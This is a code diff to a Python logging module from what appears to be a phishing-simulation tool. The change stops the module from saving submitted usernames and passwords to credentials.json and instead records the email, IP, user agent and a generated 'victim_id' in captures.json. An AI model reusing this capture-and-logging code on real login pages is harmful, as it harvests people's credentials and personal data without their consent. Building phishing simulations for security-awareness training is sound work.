@@ -1,21 +1,25 @@
+"""Registar metadados em captures.json (sem passwords)."""
+
 import json
 import os
+import uuid
 from datetime import datetime, timezone
 
-LOG_PATH = os.path.join(os.path.dirname(__file__), "..", "data", "logs", "credentials.json")
+LOG_PATH = os.path.join(os.path.dirname(__file__), "..", "data", "logs", "captures.json")
 
 
-def log_submission(ip: str, user_agent: str, page_id: str, username: str, password: str) -> None:
+def log_capture(email: str, ip: str, user_agent: str) -> str:
+    # Criar entrada e acrescentar ao ficheiro JSON
     log_file = os.path.normpath(LOG_PATH)
     os.makedirs(os.path.dirname(log_file), exist_ok=True)
 
+    victim_id = str(uuid.uuid4())
     entry = {
         "timestamp": datetime.now(timezone.utc).isoformat(),
+        "email": email,
         "ip": ip,
         "user_agent": user_agent,
-        "page_id": page_id,
-        "username": username,
-        "password": password,
+        "victim_id": victim_id,
     }
 
     records: list = []
@@ -30,3 +34,5 @@ def log_submission(ip: str, user_agent: str, page_id: str, username: str, passwo
 
     with open(log_file, "w", encoding="utf-8") as fh:
         json.dump(records, fh, indent=2, ensure_ascii=False)
+
+    return victim_id
